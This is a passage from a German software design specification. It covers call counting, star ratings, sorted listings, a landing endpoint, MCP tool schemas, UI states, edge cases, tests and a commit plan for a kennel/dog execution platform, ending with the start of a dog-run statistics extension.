Rating (`api/routes/KennelRatingHandler.ts`, `registerRoutes(app)` in `createHttpApplication.ts` zwischen `kennelRunHandler.registerRoutes(app)` (:291) und `frontBinder.afterKennelRoutes` (:293); kollidiert nicht mit `/api/:subpath/:id/versions` oder `/run` — anderes Literal):

```
GET    /api/kennels/:id/rating           -> 200 { "ok": true, "lineageId": "weather-kennel", "avg": 4.5, "count": 10, "score": 4.27,
                                                   "histogram": { "1": 0, "2": 1, "3": 1, "4": 3, "5": 5 }, "mine": 4 }     mine null anonym/unbewertet
PUT    /api/kennels/:id/rating {stars:4} -> 200 gleiche Form; 400 invalid_stars ("stars must be an integer 1..5"); 401 unauthorized + WWW-Authenticate;
                                            403 owner_cannot_rate | editor_cannot_rate | no_identity; 404 not_found
DELETE /api/kennels/:id/rating           -> 200 gleiche Form mit mine null (idempotent); 401/403(no_identity)/404
```

`:id` = lineageId oder Version-GUID -> `kennelsController.getById`; gespeichert wird `data.lineageId ?? data.id`. `requireLogin` in `ConfigRouteHandler.ts:16` wird exportiert und wiederverwendet.

Liste (`api/routes/ListQuery.ts`):

| Parameter | Werte | Wirkung |
|---|---|---|
| `sort` | `name` (Default) \| `createdAt` \| `updatedAt` \| `calls` \| `calls30d` \| `rating` | `calls` = `stats.calls.ranked`, `calls30d` = `stats.calls.ranked30d`, `rating` = `stats.rating.score`; Tiebreak `id` (:105-112) |
| `dir` | `asc` (Default) \| `desc` | |
| `minStars` | 1..5 | behaelt `stats.rating.avg >= minStars` (Rohschnitt) |
| `minCalls` | >= 0 | behaelt `stats.calls.ranked >= minCalls` |
| `q`, `mine`, `limit`, `offset` | wie heute (:45-55) | |

Reihenfolge in `apply` (:63-72): ACL (Aufrufer) -> mine -> q -> minStars -> minCalls -> sort -> offset/limit; `total` nach den Filtern. `stats` haengt **vor** `ListQuery.apply` (`handleList` :187-189: `const readable = filterReadable(...); await stats.attach(readable);`). `compare` (:114-117) sortiert Zahlen numerisch. Kaputte Werte -> Default, nie 500 (:41-44).

```
/api/kennels?sort=calls30d&dir=desc&limit=10               Top 10 der letzten 30 Tage
/api/kennels?sort=rating&dir=desc&minStars=4&limit=20      beste Bewertung, nur >= 4,0 Rohschnitt
/api/kennels?q=wetter&sort=rating&dir=desc&limit=20        Textsuche + Sterne
/api/kennels?mine=1&sort=calls30d&dir=desc                 ohne limit: {ok,data} wie heute (:78-83)
```

#### 4.7 `GET /api/landing`

Handler `api/routes/LandingRouteHandler.ts`, registriert **vor** `ConfigRouteHandler.registerRoutes` (`createHttpApplication.ts:211`), nicht an einer Bremse. `kennelsController.listLatest()` -> `filterReadable(list, ANON)` mit `ANON = { user: null, isSuperUser: false }` (`visibility.ts:93-95`; Owner sehen dieselbe Landing wie Fremde) -> `stats.attach` -> zwei Listen. Memo `LANDING_MEMO_MS` (60 s), invalidiert durch `statsService.invalidate()`. Header `Cache-Control: public, max-age=60`, `ETag` (Hash des Bodies), `304` bei `If-None-Match`. `limit` Default 10, Deckel 50.

```json
GET /api/landing?limit=10
200 {
  "ok": true,
  "generatedAt": "2026-09-25T09:41:00.000Z",
  "windowDays": 30,
  "topByCalls30d": [
    { "id": "<versionGuid>", "lineageId": "weather-kennel", "name": "Wetter", "emoji": "🌦️",
      "description": "<max 140 Zeichen, serverseitig gekuerzt, '…' angehaengt>",
      "url": "/k/weather-kennel?lat=51.72&lng=8.75",
      "stats": { "calls": { "...": 0 }, "rating": { "...": 0 } } }
  ],
  "topByRating": [ { "…": "gleiche Form" } ]
}
```

`url` = `publicKennelPath(lineageId)` + defaultQuery als Query-String (gleiche Logik wie `kennel-list.component.ts:420-433`; die Landing kennt das Praefix nicht — W2). `topByCalls30d`: sort `ranked30d desc`, Tiebreak `rankedTotal desc`, dann `name`; Eintraege mit `ranked30d === 0` entfallen. `topByRating`: sort `score desc`, Tiebreak `count desc`, dann `name`; `count === 0` entfaellt. Listen duerfen sich ueberschneiden. Keine Felder, die ein Anonymer nicht ohnehin ueber `/api/kennels` bekaeme.

#### 4.8 MCP

`list_kennels` — Eingabeschema (ersetzt `mcp/tools/kennels.ts:261`):

```json
{ "type": "object", "additionalProperties": false, "properties": {
    "search":   { "type": "string",  "description": "case-insensitive substring on name, displayName, description" },
    "mine":     { "type": "boolean", "description": "only kennels owned by the caller" },
    "sort":     { "type": "string",  "enum": ["name", "createdAt", "updatedAt", "calls", "calls30d", "rating"],
                  "description": "calls/calls30d = ranked usage (public + execute paths), rating = Bayes score. Default name." },
    "dir":      { "type": "string",  "enum": ["asc", "desc"] },
    "minStars": { "type": "number",  "minimum": 1, "maximum": 5, "description": "keep kennels whose raw average rating is >= minStars" },
    "minCalls": { "type": "number",  "minimum": 0, "description": "keep kennels with at least this many ranked calls" },
    "limit":    { "type": "number",  "minimum": 1, "maximum": 200,
                  "description": "page size. WITHOUT limit the result is a bare array (legacy shape); WITH limit an envelope {kennels,total,offset,limit,hasMore}." },
    "offset":   { "type": "number",  "minimum": 0 } } }
```

Handler: `ListQuery.from({ q: args.search, mine: args.mine ? '1' : undefined, sort, dir, minStars, minCalls, limit, offset })` — dieselbe Klasse wie REST. `leanKennel` (:221-231) + `stats`. Ohne `limit` bares Array (Integrationstest :224 bleibt gruen); mit `limit` `{ kennels, total, offset, limit, hasMore }` (Form wie `list_nodes` `nodes.ts:144-150`). `get_kennel`: `kennelHeader` (:234-253) + `stats`. Kein `rate_kennel` (Entscheidung). `health_check` (`meta.ts:47-57`) haengt `stats: callCounter.status()` an. `mcp/skill.md` bekommt einen Absatz "Kennels finden: `list_kennels {search, sort:'rating'|'calls30d'}`" und die `stats`-Felder; `mcp/tools/types.ts` `ToolDeps` + `kennelStats`, `callCounter`.

#### 4.9 UI — Verhalten und Datenfluss (Optik: neue Vorlage, folgt)

Modelle/Service: `ui-app/src/app/models/kennel-config.model.ts` `IKennelStats` + `stats?: IKennelStats`; `services/kennel.service.ts` `KennelSortKey` += `calls|calls30d|rating`, `KennelPageQuery` += `minStars?`, `minCalls?` (nur senden, wenn gesetzt, :62-68), neu `getRating(id)`, `setRating(id, stars)`, `deleteRating(id)` gegen `/api/kennels/:id/rating` (relativ, Dev-Proxy), `IRatingView = { ok, lineageId, avg, count, score, histogram, mine }`.

`kennel-stats-badge` (Anzeige, nie interaktiv; **Verhalten** — gebaut wird es in P6 U2/U4 als `sd-plaque` + `sd-stars aggregate`, W1/8.6): Standalone, OnPush, **eigene** inline `styles` (Muster `components/visibility-badge/visibility-badge.component.ts:5-36`) — das anyComponentStyle-Budget (`angular.json:80-83`, 20/24 kB) gilt je Stylesheet, `kennel-list.component.scss` bleibt byte-gleich. Inputs `stats: IKennelStats | undefined`, `compact = true`. Zeigt `rating.avg` (eine Nachkommastelle, englisch "4.3") mit `(count)`, und `calls.ranked30d` (W3); `title`/aria-label mit Gesamt und 30 T. Zustaende: `stats` undefined -> nichts rendern (alter Server); `count 0` -> `no ratings yet`; `ranked30d 0` -> "0", nie eine Luecke. `leadFailed` wird nicht gezeigt. Einbau in `kennel-list.component.html` als **eine** Zeile neben `<app-visibility-badge>` (:155) — der genaue Platz (Kopfzeile/Fuss) folgt mit der Vorlage; die eine Zeile ist die Regel. Zweite Verwendung im Viewer-Kopf. Tippen navigiert zu `/kennels/<id>?panel=rating`.

`kennel-rating` (interaktiv): Standalone, OnPush, eigene styles, ohne Layout-Annahme (W1). Inputs `kennelId` (lineageId), `ownerId`, `editors`, `initial?: IRatingView`; Output `changed: EventEmitter<IRatingView>`. Zustandsmaschine (Amar 8.3, woertlich):

| Zustand | Bedingung | Verhalten |
|---|---|---|
| `loading` | `getRating()` laeuft | Sterne ausgegraut, keine Interaktion |
| `anonymous` | `auth.user() === null` | Aggregat sichtbar; Klick -> `auth.login(window.location.pathname + '?panel=rating')` (`auth.service.ts:40-44`) |
| `readonly-owner` | `ownerId === auth.user()?.id` oder `editors` enthaelt die id | Aggregat (und `histogram`, wenn die Vorlage es zeigt), kein Hover, Hinweis "Eigener Kennel" |
| `unrated` | eingeloggt, `mine === null` | Hover-Vorschau, Klick -> `setRating(id, n)` -> `saving` |
| `rated` | eingeloggt, `mine` gesetzt | eigene Sterne hervorgehoben; anderer Stern -> `setRating`; derselbe Stern -> `deleteRating` |
| `saving` | Request laeuft | gesperrt |
| `error` | 4xx/5xx | Meldung `error.error_description ?? error.error`; Zustand faellt zurueck; 401 -> `anonymous` |

Nach jedem Schreiben `changed.emit(view)`; kein Polling. Der Viewer liest `?panel=rating` aus `queryParamMap` und oeffnet das Widget an seinem Ort (Kopf oder Inspector-Tab `rating`, `KennelTab` um `'rating'` erweitern — Entscheidung 8.6).

Sort-Zyklus (`kennel-list.component.ts:375-380`): `['name','createdAt','updatedAt','calls30d','rating']`; Labels (:382-391) `calls30d` -> "Aufrufe (30 T)", `rating` -> "Sterne"; Wechsel auf einen Zahlenschluessel setzt `sortDir` `desc`, auf `name` `asc`. Storage-Key (:39) `slopdogs.kennelList.sort.v3`; `readPersistedKennelListSort` (:47-67) akzeptiert die fuenf Schluessel, sonst `name/asc`. `minStars`/`minCalls` in v1 nicht in der UI.

#### 4.10 Ablauf-Sequenzen

```
Oeffentlicher Aufruf -> Zaehlung -> Flush -> Lesen
Browser        Express                  KennelRunHandler           KennelCallCounter          PrismaStore/DB
  | GET /k/wetter |                          |                          |                        |
  |-------------->| Public-Bremse(4) ok      |                          |                        |
  |               | loadKennelConfig ------->|-- resolveKennel -------------------------------->| findByLineage
  |               | canRead ok               |                          |                        |
  |               | runKennel(cfg, src=public)|                         |                        |
  |               |                          | run() ... waves          |                        |
  |               |                          | leadFailed = lead.error? |                        |
  |               |                          | finally: record(l,public,lf) -->| Map[l|day|public]++ (sync, 0 DB)
  |<-- 200 HTML --|<-- sendResult -----------|                          |                        |
  (Timer 30 s)                                                          | flush(): batch, clear  |
                                                                        |-- $transaction INSERT..ON CONFLICT..count+excluded -->|
                                                                        |<-- ok; onFlushed -> stats.invalidate()               |
Client GET /api/kennels?sort=calls30d&dir=desc&limit=10
  -> handleList: listLatest -> filterReadable -> stats.attach(readable)
                    attach: Memo abgelaufen? -> 2x GROUP BY -> Map; + counter.pendingAggregates()
               -> ListQuery.apply(sort=calls30d desc) -> envelope -> 200

Bewertung setzen
UI(kennel-rating)   KennelRatingHandler         KennelStatsService              PrismaStore
  PUT /api/kennels/wetter/rating {stars:4}
  ------------------> getById ok; canRead ok; user ja; owner/editor nein; stars ok
                      setRating ------------------> upsertKennelRating(l,user,4) ---> kennelRating.upsert
                                                   invalidate()
                                                   ratingView: readKennelRatingAggregates([l]) + readKennelRatingHistogram(l) + readKennelRating(l,user)
  <-- 200 {avg,count,score,histogram,mine:4} ----- score = (5*m + sum)/(5+n)
  changed.emit -> Viewer aktualisiert Badge

Shutdown
Render SIGTERM -> main.ts shutdown(): Not-Aus 10 s (unref)
  await httpServer.close()        — laufende Requests enden, ihr finally record() laeuft noch
  await callCounter.stop()        — clearInterval; flush(): ein $transaction
  await Promise.allSettled([store.disconnect(), json.disconnect(), http.disconnect()])
  exit(0)
SIGKILL/OOM: pending seit letztem Flush verloren (<= 30 s). Akzeptiert.
```

#### 4.11 Randfaelle

| Fall | Verhalten |
|---|---|
| Kennel geloescht | `KennelController.delete` (:419-443) ruft nach den Versionen `statsStore.deleteKennelStats(lineageId)`, `callCounter.forget(lineageId)`, `stats.invalidate()` (Deps per Setter). Ein Delta im laufenden Flush-Batch kann eine Waise erzeugen — harmlos, naechster Delete raeumt; `build_kennel`-Rollback (`kennels.ts:857-888`) nutzt denselben Pfad. |
| Kennel umbenannt | `rename` aendert nur `name`/`displayName` (`ConfigRouteHandler.ts:464-502`); lineageId bleibt -> Zaehler und Sterne bleiben. |
| `?version=` / Version-GUID als `:id` | Zaehlung und Rating auf die Lineage (`parseEntity` :727 setzt `lineageId`). |
| Zwei Instanzen beim Deploy | eigene Map + eigener Flush je Instanz; `ON CONFLICT … + excluded` addiert korrekt; Memo je Instanz <= 30 s alt; keine Doppelzaehlung (jeder Request laeuft in genau einer Instanz). |
| Tagesgrenze | `day` bei `record()` (utcDay(now)); Vortags-Delta flusht in die Vortagszeile; `sinceDay` je Memo-Reload; Anzeige in Ortszeit ist UI-Sache, Zeilen bleiben UTC. |
| Super-User ohne `user.id` (`MCP_AUTH_REQUIRED=false`) | Zaehlung normal; Bewerten 403 `no_identity`; lokale Rating-UI braucht `MCP_AUTH_REQUIRED=true` + Google-Login; Tests laufen ueber Service/Store mit Fake-Usern. |
| Private Kennels | Zaehler/Ratings existieren; `attach` laeuft nur auf `filterReadable`-Ergebnissen; Landing filtert mit ANON-ctx (`visibility.ts:42-54`: ownerless ohne Flag gilt public, owned ohne Flag privat). Die Memo-Map enthaelt private Lineages, verlaesst den Prozess aber nie ungefiltert. |
| 308 der Alt-Weiche | antwortet vor `loadKennelConfig`/`runKennel` -> kein `record()`; der Folge-Request zaehlt genau einmal (Test 11.7). |
| HEAD `/k/:id` | kein `runKennel` -> kein `record()`. |
| `dogIds` leer | 400 vor `runKennel` (:564-567) -> kein Aufruf. |
| 503 / 429 / 401 / 404 | erreichen `runKennel` nicht. |
| DB tot beim Flush | Deltas bleiben, Retry alle 30 s, `lastFlushError` im `health_check`; Deckel 10 000, danach `dropped++`; Public-Pfad merkt nichts. |
| Flush laeuft, Shutdown kommt | `stop()` wartet auf den laufenden Flush und flusht den Rest; Not-Aus 10 s. |
| `stars` als String / 4.5 / 0 / 6 | 400 `invalid_stars`. |
| Kennel ohne `lineageId` (Altbestand) | Schluessel faellt auf `config.id` (wie :157) — ueberall dieselbe Regel. |

#### 4.12 Testfaelle (Given/When/Then; StartupTest mit Cleanup `deleteKennelStats('__st_…')`, Zeit-Haken `now`)

1. **Counter zaehlt und flusht** — Given Counter `flushIntervalMs: 0`, Lineage `__st_a`; When 3x `record('__st_a','public',false)`, 1x `record('__st_a','public',true)`, 1x `record('__st_a','api-run',false)`, `flush()`; Then `readKennelCallAggregates(sinceDay,['__st_a'])` = `{total 5, last30d 5, leadFailed 1, rankedTotal 4, ranked30d 4}`; zweites `flush()` aendert nichts; `pendingAggregates()` leer.
2. **Increment addiert** — Given Zeile aus 1; When 2x record + flush; Then total 7.
3. **Keine unknown-Zaehlung** — Given `KennelRunHandler` mit Test-Counter; When die vier HTTP-Handler (Fake req/res) und die drei `kennels.ts`-Tools laufen; Then je Weg genau eine Delta-Zeile mit der Quelle aus 4.5, keine `unknown`.
4. **Fehlgeschlagener Lauf** — Given Kennel ohne aufloesbare Dogs; When `runKennel` wirft; Then eine Zeile `count 1, leadFailed 1`.
5. **Tagesgrenze** — Given `now` = 2026-09-25T23:59:59Z, record; `now` = 2026-09-26T00:00:01Z, record, flush; Then zwei Zeilen; `readKennelCallAggregates('2026-09-26')` -> last30d 1, total 2.
6. **Rating-Upsert/Aggregat/Bayes** — Given keine Ratings; When userA 3★ dann 5★ auf `__st_r`; Then eine Zeile, count 1, sum 5, avg 5, m 5, score (25+5)/6 = 5,0; When userB 1★; Then count 2, sum 6, avg 3, m 3, score (15+6)/7 = 3,0; `histogram` = {1:1,5:1}; When userA delete; Then count 1, sum 1; ungeratete Lineage -> avg null, score 0.
7. **Rating-Regeln** — Given Kennel ownerId U1, editors "U2"; When setRating als U1 -> 403 owner_cannot_rate; U2 -> 403 editor_cannot_rate; U3 mit 6 -> 400; anonym -> 401; Super-User ohne user -> 403 no_identity; U3 mit 4 -> 200 mine 4. Given community-Kennel; When U1 setzt 5; Then 200.
8. **ListQuery** — Given A (ranked 10 / score 4,0), B (50 / 4,27), C (0 / 0); When `sort=calls dir=desc` -> B,A,C; `sort=rating dir=desc` -> B,A,C; `minStars=4` -> A,B (total 2); `minCalls=20` -> B; `q` kombiniert; Tiebreak stabil.
9. **Delete raeumt** — Given Zeilen in beiden Tabellen und pending Deltas fuer `__st_d`; When `kennelsController.delete('__st_d')`; Then beide Tabellen leer, `pendingAggregates` ohne `__st_d`.
10. **Shutdown flusht** — Given pending; When `stop()`; Then Timer aus, Zeilen in DB, zweites `stop()` harmlos.
11. **Integration (`mcp-gateway.integration.cjs`, lokal)** — Given Server mit `MCP_BEARER`; When `execute_kennel {id: KENNEL_ID}` dann `list_kennels {search: KENNEL_ID, sort:'calls', dir:'desc'}`; Then `stats.calls.ranked >= 1` sofort (Delta-Merge); `list_kennels {}` Array; `list_kennels {limit:3}` hat `kennels/total/hasMore`; `get_kennel` traegt `stats`. **11.7**: `GET /<KENNEL_ID>` (alter Pfad) -> 308 ohne Zaehlung; Folge-`GET /k/<KENNEL_ID>` zaehlt einmal (Vergleich `stats.calls.total` vorher/nachher = +1).
12. **Landing** — Given zwei public Kennels (X ranked30d 5 / score 0; Y ranked30d 0 / score 4,2) und ein privater mit hohen Zahlen; When `GET /api/landing?limit=10` anonym; Then `topByCalls30d = [X]`, `topByRating = [Y]`, privater in keiner Liste, jedes `url` beginnt mit `/k/`; zweiter Aufruf binnen 60 s ohne DB-Abfrage (Memo-Zaehler); `If-None-Match` mit dem ETag -> 304.

#### 4.13 Abnahmekriterien (messbar)

- `npm test` gruen (nach `prisma generate`); StartupTest 1-10, 12 gruen; `npm run test:mcp:integration` gruen lokal inkl. 11 und 11.7.
- Public-Pfad: 0 zusaetzliche DB-Roundtrips je Request (`DEBUG=prisma:query`: keine Query zwischen `runKennel` und `sendResult` ausser den bestehenden); `record()` ist synchron (kein `await`).
- Flush: hoechstens ein `$transaction` je Intervall; `health_check.stats.pending` faellt nach dem Flush auf 0.
- Liste: `GET /api/kennels?limit=20` macht hoechstens 2 zusaetzliche Statements je 30 s.
- `git diff --stat -- ui-app/src/app/pages/kennel-list/kennel-list.component.scss` leer; `npm run ui:build` ohne Budget-Fehler.
- `git grep -c "new PrismaClient\|new mod.PrismaClient"` unveraendert (4 Stellen + StartupTest).

#### 4.14 Commit-Schnitt (jeder typecheck-gruen)

1. `feat(store): KennelCallDaily + KennelRating in beiden Schemas, IKennelStatsStore, PrismaStore` — 4.1, 4.2. Kein Aufrufer.
2. `feat(stats): KennelCallCounter mit Flush/Deckel/Shutdown, Env-Doku` — 4.3, `main.ts`, `.env`-Beispiele. Tests 1, 2, 5, 10.
3. `feat(run): runKennel zaehlt jeden Lauf, neun Aufrufstellen attribuiert` — 4.5. Tests 3, 4.
4. `feat(stats): KennelStatsService (attach, Memo, Bayes), stats an Kennel-Antworten, Delete raeumt` — 4.4, 4.6 (stats), `KennelController.delete`. Tests 6, 9.
5. `feat(api): Rating-Endpunkte mit Histogramm` — 4.6 (Rating), Regeln 4.4.1. Test 7.
6. `feat(api): ListQuery sortiert/filtert nach Aufrufen und Sternen; list_kennels mit Parametern; get_kennel stats; health_check; skill.md` — 4.6 (Liste), 4.8. Test 8, Integrationstest 11.
7. `feat(api): GET /api/landing` — 4.7. Test 12.
8. **entfaellt in P4 — wird P6 U2/U4** (Lotus: UI-Teile in P6). In P4 bleibt UI-seitig nur das API-Minimum: `kennel.service.ts` (SortKey, PageQuery, Rating-Calls), `kennel-config.model.ts` (`IKennelStats`), damit P6 gegen fertige Typen baut. Begruendung: die Liste wird in U2 komplett ersetzt (Zeilen statt Karten, `kennel-list.component.scss` faellt); eine Badge in die alte Karte zu bauen, waere Wegwerfarbeit. Verhalten (4.9) bleibt der Vertrag fuer U2/U4.
9. `test(mcp): 308 zaehlt nicht (11.7)` — braucht P3 Commit 2.
10. `docs(mcp): Texte fuer P4` — 4.0.

Abhaengigkeiten: 3 braucht 2; 4 braucht 1+2; 5-7 brauchen 4; 9 braucht 3 und P3; 10 zuletzt. Amars Commit 8 (Gate) ist nach P1 gewandert (W4). P4 setzt P3.5 Commit 1+3 voraus (`canRun` fuer das Rating-Gate; `filterRunnable` fuer Listen und Landing — run-only-Kennels erscheinen in Ranglisten, 8.17).

### P4b — Dog-Aufrufe, Wiederverwendung, "Bewaehrt"

Quelle: Amar `amar_slopdogs_dogs.md` (vollstaendig eingearbeitet). Baut auf P4 auf — **erweitert**, kein zweiter Counter, kein zweiter Client. Alle Beispielzahlen sind Formbeispiele; die einzigen gerechneten Werte sind ausdruecklich so benannt.

**Ziel.** (a) Jeder Lauf eines einzelnen Dogs wird gezaehlt — mit Ergebnisklasse (`ok`/`cached`/`error`/`timeout`/`oom`), Laufzeit und Cache-Treffern — an dem einen Punkt, an dem jeder Hund laeuft: `SeasonRunner.letOut()` (`packages/core/src/harverster.ts:84-115`, ruft `dog.collectYield(season)` :88, brandmarkt Fehler mit `__error` :106; Base-Dogs, SerializedDogs, Mimics, Auto-Mimics — kein zweiter Weg). (b) Wiederverwendung wird beim Speichern in eine Referenztabelle abgeleitet und beim Boot einmal idempotent aufgebaut — keine Partitions-Scans zur Laufzeit. (c) "Bewaehrt" = Nutzung x Zuverlaessigkeit x Wiederverwendung x Sterne der Kennels, mit Mindestmengen; `list_nodes` bekommt `sort=proven`, die Palette sortiert danach, die Landing zeigt bewaehrte Dogs.

#### 4b.1 Der Core wird an genau einer Stelle beruehrt — und warum das die Regel nicht bricht

Die Projektregel lautet "Pakte nicht in core" (und: kein Schema, kein Store-Zugriff im Core). P4b fuegt dem Core **einen Observer-Vertrag** hinzu (`IDogRunObserver`, ein Interface plus eine reine Klassifikationsfunktion und zwei Marker-Konstanten) und **einen Cache-Wrapper** am bestehenden Injektionspunkt (`KennelRun.ts:281-294`). Das ist dasselbe Muster, mit dem der Core heute schon `MimicAdopter` (`KennelRun.ts:98-101`) und `ICacheHandler` entgegennimmt: der Core definiert die Schnittstelle, die App implementiert sie. Kein Pakt, kein Prisma-Modell, kein Import aus `store/` oder `services/` wandert in `packages/core`. Wer die Regel liest als "core darf keine neue Datei bekommen", liest sie falsch; sie verbietet Fachvertraege (Pakte) und Persistenz im Core — beides bleibt draussen. Der Zaehler, der Schluessel, die Persistenz und die Formel leben in `services/` und `store/`.

Warum der Core ueberhaupt: `letOut` ist die einzige Stelle, an der ein Dog-Lauf beginnt und endet (Amar A.1); der Core kennt aber weder Kennel-Lineage noch Aufrufquelle noch Persistenz. Deshalb Observer nach aussen, Closure in `runKennel` fuellt Lineage und Quelle.

#### 4b.2 Core-Vertrag (woertlich)

> **Gemessen 2026-09-26 (P4b, StartupTest 14, --expose-gc):** 403-406 Byte je pending-Eintrag (rund 0,4 MB je 1 000 Eintraege) — rund das Doppelte der Rechnung (~200 Byte), aber unter der 1-MB-Schwelle aus 4b.11; Deckel `KENNEL_CALL_MAX_PENDING` bleibt 10 000 (voll ≈ 4 MB, Amars schlimmster Fall mit 4 000 Eintraegen ≈ 1,6 MB, beides aus dem Messwert gerechnet). `pendingDogs` 20 nach einem 20-Dog-Lauf und nach 100 Laeufen ohne Flush (gleiche Schluessel). `recordDog` 1,2-1,3 µs je Dog. RSS vor/nach einer Welle 527->556 MB (Worker-Isolates, voruebergehend), heapUsed +0,25 bis 3 MB.


```ts
// packages/core/src/core/entities/IDogRunObserver.ts (neu, Export in packages/core/src/index.ts)
export type DogRunOutcome = 'ok' | 'error' | 'timeout' | 'oom';
export interface DogRunReport {
    dog: IHuntingDog<unknown>;
    outcome: DogRunOutcome;
    durationMs: number;        // um collectYield, inkl. Worker-Start
    cacheHits: number;         // getOrFetch-Aufrufe, die OHNE factory zurueckkamen (Hit oder In-flight-Dedup)
    cacheMisses: number;       // getOrFetch-Aufrufe, die factory gerufen haben
    waveIndex: number;
    errorMessage?: string;
}
export interface IDogRunObserver { onDogRun(report: DogRunReport): void; }   // synchron, darf nie werfen
export const DOG_TIMEOUT_MARKER = 'VM execution timed out after';           // SerializedDog.ts:1031 nutzt die Konstante
export const DOG_OOM_MARKER = 'sandbox worker exceeded its heap limit';      // SerializedDog.ts:837
export function classifyDogError(msg: string): DogRunOutcome;               // timeout | oom | error
```

Drei Core-Stellen:

1. `SeasonRunner` (`harverster.ts:59-61`) bekommt `options.observer?: IDogRunObserver`; `KennelRun.runSeason` (:465-472) reicht `this.dogRunObserver` durch; Setter `KennelRun.setDogRunObserver(o)` neben `setCapabilityContext`.
2. `letOut` (:84-115) misst `Date.now()` um `collectYield`, setzt `__cacheStats` des Dogs vor dem Lauf auf 0/0, klassifiziert im `catch` (`__error` bleibt wie :106), ruft im `finally` `observer?.onDogRun({...})` in try/catch — ein werfender Observer darf die Welle nicht toeten (Fehler einmal je Prozess loggen).
3. Cache-Wrapper `packages/core/src/cache/withDogCacheStats.ts` (neu): `dog.setCacheHandler(withDogCacheStats(this.cacheHandler!, dog))` statt :286; delegiert alle `ICacheHandler`-Methoden (`ICacheHandler.ts:20-52`), ersetzt nur `getOrFetch`: `fetched`-Flag in der Factory, nach Aufloesung oder Ablehnung `hits++`/`misses++` in `(dog as any).__cacheStats`. NEG-HIT (Provider-Fehler kurz gecacht, `PrismaCacheHandler.ts:139-141`) und In-flight-Dedup (:143-147) zaehlen als Hit (nichts geholt). Kein `has()`-Vorabruf, keine zweite Leserunde. Tile-Feature-Cache (`setTileFeatureCache`) bleibt in v1 ungezaehlt (tile-granular, ein Hit/Miss je Dog waere gelogen).

Ergebnisklasse je Lauf genau eine: `ok` (kein `__error`, >= 1 Miss oder kein Cache), `cached` (kein `__error`, >= 1 Hit, 0 Misses), `error`, `timeout`, `oom`. Ein Cache-Treffer **zaehlt als Lauf**: die Frage ist "wurde der Hund gebraucht und hat er geliefert", nicht "hat er einen Provider belastet"; fuer die Provider-Sicht bleiben `cacheHits`/`cacheMisses` getrennt.

Schluessel `dogKey` (`services/dogStatsKey.ts`, `dogStatsKeyOf(dog)`): SerializedDog/MimicDog **mit** `lineageId` (`SerializedDog.ts:646-648`) -> die lineageId (Versionen zaehlen auf die Lineage); Base-Dog -> `'base:' + dog.name` (identisch mit `BASE_DOG_PREFIX + name`, `NodesRouteHandler.ts:26`); SerializedDog **ohne** lineageId (frischer Auto-Mimic-Platzhalter `KennelRun.ts:443-449`) -> `null`, nicht zaehlen (sein Fehler steht am Kennel als `leadFailed`). Zeile: `(dogKey, kennelLineageId, day, source)` — Kennel und Quelle kommen aus dem Observer-Closure in `runKennel` (dieselben Werte wie `KennelCallDaily`).

**Speicherkosten — eine Rechnung aus Annahmen, nicht gemessen.** Amar rechnet je Eintrag ~80 Byte Schluessel + ~120 Byte Zeile = ~200 Byte; 20-Dog-Kennel x 2 Quellen = 40 Eintraege = ~8 KB; schlimmster Fall 200 aktive Kennels x 10 Dogs x 2 Quellen = 4 000 Eintraege = ~800 KB je 30 s. Annahmen darin: Zeilenlaenge, Dog-Zahl je Kennel, Zahl aktiver Kennels — keine davon gemessen. Der Wert steht deshalb als **Messpunkt in der Abnahme (4b.9)**: `process.memoryUsage().heapUsed` vor/nach 100 Laeufen eines 20-Dog-Kennels und `counter.status().pendingDogs`. Deckel gemeinsam mit den Kennel-Deltas gegen `KENNEL_CALL_MAX_PENDING`; aeltere Schluessel gewinnen. Der Observer laeuft synchron im `finally` — kein Promise, kein `await`, keine Verlaengerung der Welle.

#### 4b.3 Prisma-Modelle (woertlich, in beide Dateien, hinter `KennelRating`)

```prisma
// Dog-Laeufe je Dog-Schluessel, Kennel-Lineage, Tag (UTC) und Quelle. dogKey = Dog-lineageId oder 'base:<Klasse>'.
model DogCallDaily {
  dogKey          String
  kennelLineageId String
  day             String
  source          String
  count           Int @default(0)
  ok              Int @default(0)    // ohne Fehler, mindestens ein Fetch oder kein Cache
  cached          Int @default(0)    // ohne Fehler, nur Cache-Treffer
  errors          Int @default(0)
  timeouts        Int @default(0)
  oom             Int @default(0)
  cacheHits       Int @default(0)    // Summe getOrFetch-Treffer
  cacheMisses     Int @default(0)    // Summe getOrFetch-Fetches
  durationMsSum   Int @default(0)    // Int reicht: 2^31 ms ~ 24 Tage Summe je Zeile und Tag
  durationMsMax   Int @default(0)

  @@id([dogKey, kennelLineageId, day, source])
  @@index([day])
  @@index([kennelLineageId])
}

// Referenzen der Kopfversionen: Kennel -> Dog (dogIds) und Dog -> Dog (parents). toKey = lineageId | 'base:<Klasse>' | Rohwert (dangling).
model DogReference {
  fromKind    String   // 'kennel' | 'dog'
  fromKey     String   // Kennel-lineageId bzw. Dog-lineageId
  toKey       String
  kind        String   // 'crew' (dogIds) | 'required' | 'optional'
  position    Int      // Index im Ursprungsarray; 0 bei kind='crew' = Lead
  fromOwnerId String?  // ownerId des Ursprungs (null = community) — fuer den Crew-Effekt ohne Join
  resolved    Int      @default(1)   // 0 = Ziel beim Schreiben nicht aufloesbar (dangling)

  @@id([fromKind, fromKey, toKey, kind, position])
  @@index([toKey])
  @@index([fromKey])
}
```

Keine FK (cross-Tabelle/-DB, Versionen). `position` im PK erlaubt denselben Dog zweimal in einer Kette (required und optional).

#### 4b.4 Store-Vertrag (Erweiterung von `store/IKennelStatsStore.ts` — eine Datei, ein Vertrag)

```ts
export interface DogCallDelta {
    dogKey: string; kennelLineageId: string; day: string; source: KennelCallSource;
    count: number; ok: number; cached: number; errors: number; timeouts: number; oom: number;
    cacheHits: number; cacheMisses: number; durationMsSum: number; durationMsMax: number;
}
export interface DogCallAggregate {
    dogKey: string;
    total: number; last30d: number; ranked30d: number;
    failures30d: number;            // errors + timeouts + oom, 30 d
    cached30d: number; durationMsSum30d: number; count30d: number; durationMsMax30d: number;
    kennelsRun30d: number;          // distinct kennelLineageId mit count > 0 in 30 d
}
export interface DogKennelUsage { dogKey: string; kennelLineageId: string; count30d: number; failures30d: number; }
export interface DogReferenceRow {
    fromKind: 'kennel' | 'dog'; fromKey: string; toKey: string; kind: 'crew' | 'required' | 'optional';
    position: number; fromOwnerId: string | null; resolved: 0 | 1;
}
export interface IDogStatsStore {
    incrementDogCalls(deltas: DogCallDelta[]): Promise<void>;
    readDogCallAggregates(sinceDay: string, dogKeys?: string[]): Promise<DogCallAggregate[]>;
    readDogKennelUsage(sinceDay: string, dogKey: string): Promise<DogKennelUsage[]>;
